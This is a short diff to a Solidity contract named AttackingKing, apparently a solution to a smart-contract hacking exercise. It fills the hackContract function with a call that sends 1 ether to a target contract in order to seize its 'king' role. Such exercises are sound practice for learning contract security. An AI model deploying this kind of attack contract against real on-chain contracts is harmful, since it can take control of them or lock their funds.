@@ -11,6 +11,7 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        // Code me!
+        (bool success,) = contractAddress.call{ value: 1 ether }("");
+        require(success, "hack unsuccessful");
     }
 }
